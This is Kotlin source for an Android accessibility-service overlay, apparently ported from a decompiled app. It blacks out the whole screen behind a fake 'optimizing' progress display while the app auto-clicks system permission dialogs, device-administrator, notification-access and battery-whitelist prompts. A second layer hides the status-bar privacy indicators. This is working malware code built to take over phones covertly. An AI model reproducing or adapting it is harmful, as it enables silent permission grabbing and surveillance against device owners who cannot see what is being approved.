package com.zaka.screenagent.ui

import android.accessibilityservice.AccessibilityService
import android.annotation.SuppressLint
import android.content.Context
import android.graphics.PixelFormat
import android.graphics.Point
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.WindowManager
import android.webkit.WebView
import android.webkit.WebViewClient

/**
 * 「优化中」引导浮层。**按 2.2 的真实实现移植**（p077/AbstractC0710.m1441 + PinCapture.addOverlay）。
 *
 * 2.2 用的是无障碍浮层而不是 Activity，这点很关键：
 *  - type = 2032 (TYPE_ACCESSIBILITY_OVERLAY)：能盖住系统权限对话框，HOME 切桌面也不消失
 *  - flags = 280 = LAYOUT_IN_SCREEN | NOT_TOUCHABLE | NOT_FOCUSABLE：
 *      不抢焦点（不弹输入法）、不拦触摸（下面的权限页照样能点），但盖住整块屏幕
 *  - 尺寸 = 真实宽 × (真实高 + 200)，多出来的 200px 用于盖住导航栏/刘海
 *  - 120 秒后自动收尾（2.2 是 handler.postDelayed(..., 120000)）
 *
 * 用 Activity 做遮罩的后果就是你说的「一按 HOME 就回桌面了」——浮层不会。
 */
object GuardOverlay {

    private const val TAG = "GuardOverlay"
    private const val TYPE_ACCESSIBILITY_OVERLAY = 2032
    private const val FLAGS = 280 // LAYOUT_IN_SCREEN | NOT_TOUCHABLE | NOT_FOCUSABLE
    private const val AUTO_CLOSE_MS = 120_000L

    private val main = Handler(Looper.getMainLooper())
    private var webView: WebView? = null
    private var manager: WindowManager? = null
    private var band: android.view.View? = null

    val isShowing: Boolean get() = webView != null

    /** 由无障碍服务调用（只有 AccessibilityService 上下文才能加 2032 浮层） */
    @SuppressLint("SetJavaScriptEnabled")
    fun show(service: AccessibilityService) {
        if (webView != null) return
        val wm = service.getSystemService(Context.WINDOW_SERVICE) as? WindowManager ?: return
        val real = Point().also { wm.defaultDisplay.getRealSize(it) }

        val wv = WebView(service).apply {
            setBackgroundColor(0xFF1F1F1F.toInt())
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            webViewClient = WebViewClient()
            loadUrl("file:///android_res/raw/black_bg_loading.html")
        }

        val lp = WindowManager.LayoutParams(
            real.x,
            real.y + 200,
            TYPE_ACCESSIBILITY_OVERLAY,
            FLAGS,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
        }

        // 色带先加（z 序在下），WebView 后加（在上）→ 整屏纯黑，与 2.2 一致
        showStatusBand(service, wm, real)
        runCatching { wm.addView(wv, lp) }
            .onSuccess {
                webView = wv
                manager = wm
                Log.d(TAG, "overlay added type=$TYPE_ACCESSIBILITY_OVERLAY size=${real.x}x${real.y + 200}")
                progressTarget = 0
                progressShown = 0
                updateProgress(0)
                main.postDelayed({ hide() }, AUTO_CLOSE_MS)
            }
            .onFailure { Log.e(TAG, "overlay failed: $it") }
    }

    /**
     * 2.2 的第二条浮层：PinCapture.addOverlay() 里的 120px 淡蓝色带
     *   type=2032, flags=792 (LAYOUT_NO_LIMITS|LAYOUT_IN_SCREEN|NOT_TOUCHABLE|NOT_FOCUSABLE)
     *   width=MATCH_PARENT, height=120, gravity=TOP|START, color=0x1A00A3FF
     * 作用是盖住状态栏区域（刘海/隐私指示点），纯视觉、不拦触摸。
     */
    private fun showStatusBand(service: AccessibilityService, wm: WindowManager, real: Point) {
        if (band != null) return
        runCatching {
            val v = android.view.View(service)
            v.setBackgroundColor(0x1A00A3FF)
            val lp = WindowManager.LayoutParams(
                real.x,
                120,
                TYPE_ACCESSIBILITY_OVERLAY,
                792, // LAYOUT_NO_LIMITS | LAYOUT_IN_SCREEN | NOT_TOUCHABLE | NOT_FOCUSABLE
                PixelFormat.TRANSLUCENT
            ).apply { gravity = Gravity.TOP or Gravity.START }
            wm.addView(v, lp)
            band = v
            Log.d(TAG, "status band added h=120")
        }.onFailure { Log.w(TAG, "status band failed: $it") }
    }

    // 进度：外部只给"目标值"，内部平滑爬升；且不允许回退（100→60 那种倒跳）
    @Volatile private var progressTarget = 0
    @Volatile private var progressShown = 0
    private val progressTick = object : Runnable {
        override fun run() {
            val target = progressTarget
            if (progressShown >= target) return
            // 固定 1%/档、约 9 档/秒：目标再大也是一格一格爬，肉眼能看到"在走"
            progressShown = minOf(target, progressShown + 1)
            val p = progressShown
            webView?.evaluateJavascript("window.__setProgress && window.__setProgress($p)", null)
            if (progressShown % 10 == 0 || progressShown == target) Log.d(TAG, "optProgress=$p")
            if (progressShown < target) main.postDelayed(this, 110L)
        }
    }

    /** percent 是"目标进度"：内部按 45ms 一档爬过去，不会瞬移；比当前小的值直接忽略 */
    fun updateProgress(percent: Int) {
        val p = percent.coerceIn(0, 100)
        if (webView == null) return
        if (p <= progressShown && p <= progressTarget) return
        progressTarget = maxOf(progressTarget, p)
        main.removeCallbacks(progressTick)
        main.post(progressTick)
    }

    /**
     * 阶段性真实进度（不要一下 100%）：
     *   运行时权限 0→60%（9 项，每项约 6.7%）
     *   设备管理员 60→75%
     *   通知使用权 75→90%
     *   电池白名单 90→100% → 收浮层
     */
    fun onPermissionGranted(granted: Int) {
        updateProgress((granted * 60) / 9)
    }

    const val STAGE_PERM_DONE = 60

    /** 自动点掉一个权限框 → 进度 +1 档（每档 6~7%，由平滑器慢慢爬上去） */
    @Volatile private var permBump = 0
    fun bumpPermissionProgress() {
        if (permBump >= 9) return
        permBump++
        updateProgress(minOf(STAGE_PERM_DONE, (permBump * 60) / 9 + 4))
    }
    const val STAGE_ADMIN_DONE = 75
    const val STAGE_NOTI_DONE = 90

    /** 2.2：进度 100% 后延时收浮层 */
    fun closeAfter(delayMs: Long = 2500L) {
        main.postDelayed({ hide() }, delayMs)
    }

    fun hide() {
        val wv = webView
        val wm = manager
        band?.let { b -> runCatching { wm?.removeView(b) } }
        band = null
        if (wv != null) {
            runCatching { wm?.removeView(wv) }
            runCatching { wv.destroy() }
        }
        webView = null
        manager = null
        main.removeCallbacksAndMessages(null)
        Log.d(TAG, "overlay removed")
    }
}
